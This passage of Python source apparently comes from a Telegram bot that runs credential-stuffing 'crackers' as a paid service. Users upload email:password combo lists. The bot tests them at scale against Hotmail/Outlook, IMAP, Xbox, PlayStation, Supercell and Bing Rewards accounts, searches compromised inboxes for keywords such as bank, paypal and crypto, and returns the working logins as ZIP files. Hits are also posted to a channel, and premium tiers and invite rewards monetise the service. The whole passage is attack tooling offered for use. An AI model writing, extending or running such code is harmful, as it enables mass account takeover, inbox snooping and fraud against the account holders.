        # ==================== INVITE REWARDS ====================
        if data == "redeem_invite_tier":
            stats = self.key_manager.get_invite_stats(user_id)
            invite_count = stats.get("invite_count", 0)
            claimed_tiers = stats.get("claimed_tiers", [])
            
            # Find available tiers
            available_tiers = []
            tiers_info = [
                (1, 5, 1),
                (2, 10, 3),
                (3, 25, 7),
                (4, 50, 30)
            ]
            
            for tier_num, needed, key_days in tiers_info:
                if invite_count >= needed and tier_num not in claimed_tiers:
                    available_tiers.append((tier_num, needed, key_days))
            
            if not available_tiers:
                # Show what's needed - send as message
                text = f"❌ **YOU DON'T MEET REQUIREMENTS**\n\n📊 Invites: `{invite_count}`\n\n"
                for tier_num, needed, key_days in tiers_info:
                    if tier_num not in claimed_tiers and invite_count < needed:
                        remaining = needed - invite_count
                        text += f"• Tier {tier_num}: Need `{remaining}` more (→ {key_days}d)\n"
                text += "\n📤 **Share your invite link to unlock rewards!**"
                await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📋 Share Link", callback_data="copy_invite_link")],
                    [InlineKeyboardButton("🔙 Back", callback_data="menu_invite_rewards")]
                ]))
                return
            
            # Show tier selection
            text = "🎁 **SELECT REWARD TO CLAIM**\n\n"
            text += f"📊 **Your Invites:** `{invite_count}`\n\n"
            text += "**Available Rewards:**\n\n"
            keyboard = []
            
            for tier_num, needed, key_days in available_tiers:
                text += f"✅ Tier {tier_num}: {needed}→**{key_days} days**\n"
                keyboard.append([InlineKeyboardButton(f"🎁 TIER {tier_num} ({key_days}D)", callback_data=f"claim_reward_{tier_num}")])
            
            keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_invite_rewards")])
            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
            return
        
        if data.startswith("claim_reward_"):
            tier = int(data.split("_")[2])
            await self._handle_claim_invite_reward(query, user_id, tier, context)
            return
        if data == "copy_invite_link":
            stats = self.key_manager.get_invite_stats(user_id)
            invite_code = stats.get("invite_code", "")
            if invite_code:
                invite_link = f"https://t.me/HotmailMasterBot?start=inv_{invite_code}"
                await query.answer(f"✅ Link copied! Share: {invite_link}", show_alert=True)
            return

        # ==================== KEYWORD INBOX SCANNER - FULL FLOW ====================
        # UPLOAD KEYWORDS
        if data == "ki_upload_keywords":
            self.user_sessions.setdefault(user_id, {})["ki_mode"] = "keywords_upload"
            self.user_sessions[user_id]["ki_step"] = "keywords"
            await query.edit_message_text(
                "📤 *Upload Keywords File*\n\n"
                "Send a TXT file with keywords (one per line)\n\n"
                "✅ Format: One keyword per line\n"
                "❌ No special characters needed\n\n"
                "*Example file content:*\n"
                "`bank\npaypal\namazon\ncrypto\nbinance`",
                parse_mode="Markdown"
            )
            return
        
        # MANUAL KEYWORDS
        if data == "ki_manual_keywords":
            self.user_sessions.setdefault(user_id, {})["ki_mode"] = "keywords_manual"
            self.user_sessions[user_id]["ki_step"] = "keywords"
            await query.edit_message_text(
                "📝 *Enter Keywords Manually*\n\n"
                "Type keywords one per line OR comma-separated\n\n"
                "*Example 1 (line by line):*\n"
                "`bank\npaypal\namazon`\n\n"
                "*Example 2 (comma-separated):*\n"
                "`bank, paypal, amazon, crypto, binance`",
                parse_mode="Markdown"
            )
            return
        
        # UPLOAD COMBOS
        if data == "ki_upload_combos":
            keywords = self.user_sessions.get(user_id, {}).get("ki_keywords", [])
            if not keywords:
                await query.answer("❌ Add keywords first!", show_alert=True)
                return
            
            self.user_sessions[user_id]["ki_mode"] = "combos_upload"
            self.user_sessions[user_id]["ki_step"] = "combos"
            await query.edit_message_text(
                "📤 *Upload Combos File*\n\n"
                "Send a TXT file with email:password combos\n\n"
                "✅ Format: email:password (one per line)\n"
                f"✅ Keywords set: {len(keywords)}\n\n"
                "*Example file content:*\n"
                "`user@outlook.com:password123\n"
                "admin@hotmail.com:pass456\n"
                "test@live.com:secret789`",
                parse_mode="Markdown"
            )
            return
        
        # MANUAL COMBOS
        if data == "ki_manual_combos":
            keywords = self.user_sessions.get(user_id, {}).get("ki_keywords", [])
            if not keywords:
                await query.answer("❌ Add keywords first!", show_alert=True)
                return
            
            self.user_sessions[user_id]["ki_mode"] = "combos_manual"
            self.user_sessions[user_id]["ki_step"] = "combos"
            await query.edit_message_text(
                "📝 *Enter Combos Manually*\n\n"
                "Paste email:password combos (one per line)\n\n"
                f"✅ Keywords ready: {len(keywords)}\n\n"
                "*Format (MUST be email:password):*\n"
                "`user1@outlook.com:pass123\n"
                "user2@hotmail.com:pass456\n"
                "user3@live.com:password789`",
                parse_mode="Markdown"
            )
            return
        
        # CANCEL KEYWORD INBOX
        if data == "ki_cancel":
            session = self.user_sessions.get(user_id, {})
            session.pop("ki_mode", None)
            session.pop("ki_keywords", None)
            session.pop("ki_combos", None)
            session.pop("ki_step", None)
            await query.edit_message_text("❌ Keyword Inbox cancelled. Use /keyword_inbox to start over.")
            return
        
        # START SCAN
        if data == "ki_start_scan":
            keywords = self.user_sessions.get(user_id, {}).get("ki_keywords", [])
            combos = self.user_sessions.get(user_id, {}).get("ki_combos", [])
            
            if not keywords:
                await query.answer("❌ No keywords set!", show_alert=True)
                return
            
            if not combos:
                await query.answer("❌ No combos loaded!", show_alert=True)
                return
            
            if not FullCustomInboxEngine:
                await query.answer("❌ Custom inbox engine missing!", show_alert=True)
                return
            
            # Show starting message
            msg = await query.edit_message_text(
                f"🚀 *Keyword Inbox Scan Starting*\n\n"
                f"📋 Keywords: {len(keywords)}\n"
                f"📁 Combos: {len(combos)}\n"
                f"🧵 Threads: 15\n\n"
                f"⏳ *Status:* Initializing scanner...",
                parse_mode="Markdown"
            )
            
            # Run the scan
            await self._start_keyword_inbox_scan(user_id, combos, keywords, 15, context)
            return
        
        # EDIT/REDO KEYWORDS
        if data == "ki_redo_keywords":
            self.user_sessions.setdefault(user_id, {})["ki_keywords"] = []
            await query.edit_message_text(
                "🔄 *Keywords Reset*\n\n"
                "Choose new input method:\n"
                "📋 Upload new file or 📝 Type manually",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("📋 Upload", callback_data="ki_upload_keywords"),
                    InlineKeyboardButton("📝 Manual", callback_data="ki_manual_keywords")
                ]])
            )
            return

        # ==================== CRACKER SELECTIONS ====================
        if data.startswith("cracker_"):
            await self._handle_cracker_selection(query, data, user_id)
            return

        # ==================== CRACK COMMANDS (after file upload) ====================
        if data.startswith("crack_"):
            mode = data.replace("crack_", "")
            pending = self.pending_files.get(user_id)
            if not pending:
                await query.answer("❌ No pending file found. Please upload your combo file again.", show_alert=True)
                return
            file_path = pending.get('file_path')
            lines = pending.get('lines')
            if not lines:
                await query.answer("❌ Invalid pending file data.", show_alert=True)
                return
            if mode == "preloaded":
                selected_keywords = self.user_sessions.get(user_id, {}).get("selected_actual_keywords", [])
                if not selected_keywords:
                    await query.answer("❌ No services selected! Use /start → Select Services first.", show_alert=True)
                    return
                await self._start_preloaded_scan(user_id, lines, selected_keywords, 30, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "brute":
                await self._start_brute_scan(user_id, lines, 30, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "brute_root":
                await self._start_brute_root_scan(user_id, lines, 30, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "rewards":
                await self._start_rewards_scan(user_id, lines, 30, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "psn":
                await self._start_psn_scan(user_id, lines, 30, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "imap":
                await self._start_imap_scan(user_id, lines, 30, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "imap_inboxer":
                keywords = self.user_sessions.get(user_id, {}).get("imap_inboxer_keywords", [])
                if not keywords:
                    await query.answer("❌ No keywords set for IMAP Inboxer.", show_alert=True)
                    return
                await self._start_imap_inboxer_scan(user_id, lines, keywords, 30, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "hotmail_bruter":
                await self._start_hotmail_bruter_scan(user_id, lines, 30, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "country":
                countries = self.user_sessions.get(user_id, {}).get("selected_countries", [])
                await self._start_country_scan(user_id, lines, countries, 30, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "full_scan":
                await self._start_full_scan(user_id, lines, 25, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "xbox":
                if not self.xbox_cracker_engine:
                    await query.answer("❌ Xbox Cracker engine not available!", show_alert=True)
                    return
                await self._start_xbox_cracker_scan(user_id, lines, 20, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "xbox_engine":
                if not self.xbox_engine:
                    await query.answer("❌ Xbox Engine not available!", show_alert=True)
                    return
                await self._start_xbox_engine_scan(user_id, lines, 20, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            elif mode == "supercell":
                if not self.supercell_engine:
                    await query.answer("❌ Supercell Cracker engine not available!", show_alert=True)
                    return
                await self._start_supercell_cracker_scan(user_id, lines, 20, context)
                if os.path.exists(file_path):
                    os.remove(file_path)
                del self.pending_files[user_id]
                await query.message.delete()
                return
            else:
                await query.answer("❌ Unknown mode.", show_alert=True)
            return

    # ==================== CRACKER HANDLERS ====================
    async def _handle_cracker_selection(self, query, data: str, user_id: int):
        mode = data.replace("cracker_", "")
        session = self.user_sessions.setdefault(user_id, {})
        if mode == "inboxer":
            session["state"] = "waiting_inboxer_keyword"
            await query.edit_message_text(
                "📧 **Custom Inboxer (Hotmail)**\n\nEnter the service name or domain to search in inbox:\n\nExamples:\n• `Netflix`\n• `PlayStation`\n• `Amazon`\n\nSend your service name below:",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "keyword_inbox":
            # Open the keyword inbox flow
            session["ki_keywords"] = []
            session["ki_combos"] = []
            keyboard = [
                [
                    InlineKeyboardButton("📋 Upload Keywords", callback_data="ki_upload_keywords"),
                    InlineKeyboardButton("📝 Manual Keywords", callback_data="ki_manual_keywords")
                ],
                [
                    InlineKeyboardButton("📁 Upload Combos", callback_data="ki_upload_combos"),
                    InlineKeyboardButton("📝 Manual Combos", callback_data="ki_manual_combos")
                ],
                [InlineKeyboardButton("❌ Cancel", callback_data="ki_cancel")]
            ]
            await query.edit_message_text(
                "🎯 *Keyword Inbox Scanner (Full Data)*\n\n"
                "✅ Full Hotmail/Outlook checker with:\n"
                "  • Keyword search in inbox\n"
                "  • Country detection\n"
                "  • Inbox email count\n"
                "  • Domain email count\n"
                "  • 2FA detection\n"
                "  • ZIP export (organized by keyword & country)\n\n"
                "Choose input method for keywords & combos:",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return
        if mode == "preloaded":
            selected_keywords = session.get("selected_actual_keywords", [])
            if not selected_keywords:
                await query.answer("❌ No services selected! Go to Select Services first.", show_alert=True)
                return
            session["state"] = "waiting_preloaded_file"
            await query.edit_message_text(
                f"📋 **My Selected Services**\n\n✅ {len(selected_keywords)} services loaded\n\n**📁 Results will be ZIP with files named by service domain:**\nExample files:\n`playstation_com.txt`\n`netflix_com.txt`\n`spotify_com.txt`\n...etc\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "brute":
            session["state"] = "waiting_brute_file"
            await query.edit_message_text(
                "⚡ **Brute Force**\n\nFast validation - HIT/2FA/BAD only\nNo inbox scanning\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "brute_root":
            session["state"] = "waiting_brute_root_file"
            await query.edit_message_text(
                "⚡ **Brute Root (Advanced)**\n\nPowerful brute force validation - HIT/2FA/BAD\nAdvanced Microsoft API method\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return

        if mode == "rewards":
            session["state"] = "waiting_rewards_file"
            await query.edit_message_text(
                "💎 **Rewards Cracker**\n\nCheck Bing Rewards points:\n• Extracts available points\n• Detects 2FA/Locked accounts\n• Saves hits with point balances\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "psn":
            session["state"] = "waiting_psn_file"
            await query.edit_message_text(
                "🎮 **PSN Cracker**\n\nFull PlayStation account capture:\n• Birthday, Age\n• PSN Orders & Purchases\n\n**Results saved in:**\n• `psn_hits.txt` - Accounts with PSN orders\n• `psn_free.txt` - Valid accounts without PSN\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return

        if mode == "imap":
            session["state"] = "waiting_imap_file"
            await query.edit_message_text(
                "📧 **IMAP Checker**\n\nSimple validation only (no inbox).\nSupports 1000+ email providers.\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "imap_inboxer":
            session["state"] = "waiting_imap_inboxer_keywords"
            await query.edit_message_text(
                "📧 **IMAP Inboxer**\n\nValidates accounts AND searches inbox for keywords.\nIf keyword found, hit saved in `{keyword}.txt` file.\n\n**Enter keywords (one per line):**\n\nExamples:\n`paypal`\n`amazon`\n`netflix`\n\nSend your keywords (one per line):",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "hotmail_bruter":
            session["state"] = "waiting_hotmail_bruter_file"
            await query.edit_message_text(
                "🔥 **Hotmail Bruter**\n\nAccurate Microsoft login validation\n• Returns HIT, 2FA, BAD, LOCKED\n• Uses working Microsoft API\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "country":
            session["state"] = "waiting_country_file"
            session["selected_countries"] = []  # Default: all countries
            await query.edit_message_text(
                "🌍 **Country Cracker**\n\nCracks accounts and extracts country information!\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nThe bot will:\n1. Check each account\n2. Extract country info\n3. Save results by country\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "xbox":
            if not self.xbox_cracker_engine:
                await query.answer("❌ Xbox Cracker engine not available!", show_alert=True)
                return
            session["state"] = "waiting_xbox_file"
            await query.edit_message_text(
                "🎮 **Xbox Cracker**\n\nFull Xbox account capture:\n• Xbox Live status\n• Xbox Game Pass type\n• Gamertag & Profile\n• Email Access\n• 2FA detection\n• Premium breakdown\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "xbox_engine":
            if not self.xbox_engine:
                await query.answer("❌ Xbox Engine not available!", show_alert=True)
                return
            session["state"] = "waiting_xbox_engine_file"
            await query.edit_message_text(
                "🎮 **Xbox + Minecraft + GamePass**\n\nFull Xbox/Minecraft account capture:\n• Minecraft Accounts\n• Xbox Game Pass Status\n• Xbox Live Premium\n• Gamertag & Profile\n• Game entitlements\n• Email Access\n• 2FA detection\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "supercell":
            if not self.supercell_engine:
                await query.answer("❌ Supercell Cracker engine not available!", show_alert=True)
                return
            session["state"] = "waiting_supercell_file"
            await query.edit_message_text(
                "🍀 **Supercell Cracker**\n\nFull Supercell game account capture:\n• Clash Royale accounts\n• Brawl Stars accounts\n• Clash of Clans accounts\n• Hay Day accounts\n• Game progression data\n• Email Access\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return
        if mode == "full_scan":
            session["state"] = "waiting_full_scan_file"
            await query.edit_message_text(
                "🚀 **FULL SCAN - ALL FEATURES**\n\n✨ **What it does:**\n• Runs ALL crackers simultaneously\n• Brute Force validation\n• MC Account capture\n• PSN data extraction\n• Bing Rewards points\n• IMAP validation\n• Hotmail accuracy checks\n• Country extraction\n\n📦 **Combined results in ONE ZIP file**\nWith results from all services!\n\n⏱️ **Time:** Faster than running individually\n🎯 **Best for:** Comprehensive account analysis\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return

    # ==================== SCAN IMPLEMENTATIONS ====================
    async def _start_preloaded_scan(self, user_id: int, combos: List[str], keywords: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        # Only enforce daily limit for FREE users (including free gift lines)
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            free_lines = self.key_manager.get_free_lines_available(user_id)
            effective_limit = limit + free_lines
            
            if daily_used + len(unique_combos) > effective_limit:
                await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"❌ Daily limit reached ({limit} lines). You have {free_lines:,} bonus lines available. Upgrade to premium for unlimited access.")
                return
            
            # Consume lines (free lines first, then daily)
            success, lines_from_free, lines_from_daily = self.key_manager.add_daily_used_with_free_lines(user_id, len(unique_combos))
            if not success:
                await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text="❌ Daily limit reached.")
                return
        scan_stats = LiveStats()
        chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
        if not chat_id:
            return
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)
        keyword_results = defaultdict(list)
        all_hits = []
        all_2fa = []
        bad_count = 0
        error_count = 0
        results_lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            nonlocal bad_count, error_count
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                result = self.scanner_engine.check_single(email, pwd, keywords)
                if result.get('status') == 'HIT':
                    scan_stats.increment_hits()
                    # Find which keyword was matched from services
                    matched_keyword = None
                    if result.get('services'):
                        for service in result['services']:
                            if service in keywords:
                                matched_keyword = service
                                break
                    with results_lock:
                        all_hits.append(combo)
                        if matched_keyword:
                            keyword_results[matched_keyword].append(combo)
                elif result.get('status') == '2FA':
                    scan_stats.increment_2fa()
                    with results_lock:
                        all_2fa.append(combo)
                elif result.get('status') == 'BAD':
                    scan_stats.increment_bad()
                    with results_lock:
                        bad_count += 1
                else:
                    scan_stats.increment_errors()
                    with results_lock:
                        error_count += 1
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"Preloaded error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        final_snapshot = scan_stats.get_snapshot()
        try:
            zip_path = self.zip_creator.create_combined_zip(dict(keyword_results), all_hits, bad_count, all_2fa)
        except:
            zip_path = None
        completion_text = f"✅ **SCAN COMPLETED!**\n\n```\n📊 Total:    {final_snapshot['total']:,}\n✅ Checked:  {final_snapshot['checked']:,}\n🎯 Hits:     {final_snapshot['hits']:,}\n📱 2FA:      {final_snapshot['two_fa']:,}\n❌ Bad:      {final_snapshot['bad']:,}\n⚠️ Errors:   {final_snapshot['errors']:,}\n```\n\n⏱️ **Time:** {final_snapshot['elapsed']}\n📁 **Services with results:** {len([k for k, v in keyword_results.items() if v])}\n"
        if keyword_results:
            completion_text += "\n**📊 Service Breakdown:**\n"
            for kw, results in sorted(keyword_results.items(), key=lambda x: -len(x[1]))[:10]:
                # Escape Markdown characters in service name
                kw_safe = kw.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('`', '\\`')
                completion_text += f"  • {kw_safe}: {len(results)} hits\n"
        try:
            if zip_path and os.path.exists(zip_path):
                with open(zip_path, 'rb') as f:
                    await context.bot.send_document(chat_id=chat_id, document=InputFile(f, filename=os.path.basename(zip_path)), caption=completion_text, parse_mode=ParseMode.MARKDOWN)
                try:
                    os.remove(zip_path)
                except:
                    pass
            else:
                await context.bot.send_message(chat_id=chat_id, text=completion_text, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            await context.bot.send_message(chat_id=chat_id, text=completion_text + f"\n\n⚠️ Error sending results: {str(e)}", parse_mode=ParseMode.MARKDOWN)
        self.key_manager.update_user_stats(user_id, len(unique_combos), len(all_hits))

    async def _start_brute_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)
        hits = []
        two_fa_list = []
        bad = 0
        errors = 0
        results_lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            nonlocal bad, errors
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                result = self.brute_engine.validate_single(email, pwd)
                if result == "HIT":
                    scan_stats.increment_hits()
                    with results_lock:
                        hits.append(f"{email}:{pwd}")
                elif result == "2FA":
                    scan_stats.increment_2fa()
                    with results_lock:
                        two_fa_list.append(f"{email}:{pwd}")
                elif result == "BAD":
                    scan_stats.increment_bad()
                    with results_lock:
                        bad += 1
                else:
                    scan_stats.increment_errors()
                    with results_lock:
                        errors += 1
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"Brute error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        final = scan_stats.get_snapshot()
        result_text = f"✅ **BRUTE SCAN COMPLETED!**\n\n```\n📊 Total:    {final['total']:,}\n🎯 Hits:     {final['hits']:,}\n📱 2FA:      {final['two_fa']:,}\n❌ Bad:      {final['bad']:,}\n⚠️ Errors:   {final['errors']:,}\n```\n\n⏱️ Time: {final['elapsed']}"
        if hits:
            hits_content = "\n".join(hits)
            try:
                await context.bot.send_document(chat_id=chat_id, document=InputFile(io.BytesIO(hits_content.encode()), filename="brute_hits.txt"), caption=result_text, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await context.bot.send_message(chat_id=chat_id, text=result_text, parse_mode=ParseMode.MARKDOWN)
            # Post hits to results channel
            await self._post_hits_to_channel("brute", hits, user_id, context)
        else:
            await context.bot.send_message(chat_id=chat_id, text=result_text, parse_mode=ParseMode.MARKDOWN)
        self.key_manager.update_user_stats(user_id, len(unique_combos), len(hits))

    async def _start_brute_root_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)
        hits = []
        two_fa_list = []
        bad = 0
        errors = 0
        results_lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            nonlocal bad, errors
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                result = self.brute_engine.validate_single(email, pwd)
                if result == "HIT":
                    scan_stats.increment_hits()
                    with results_lock:
                        hits.append(f"{email}:{pwd}")
                elif result == "2FA":
                    scan_stats.increment_2fa()
                    with results_lock:
                        two_fa_list.append(f"{email}:{pwd}")
                elif result == "BAD":
                    scan_stats.increment_bad()
                    with results_lock:
                        bad += 1
                else:
                    scan_stats.increment_errors()
                    with results_lock:
                        errors += 1
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"Brute root error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        final = scan_stats.get_snapshot()
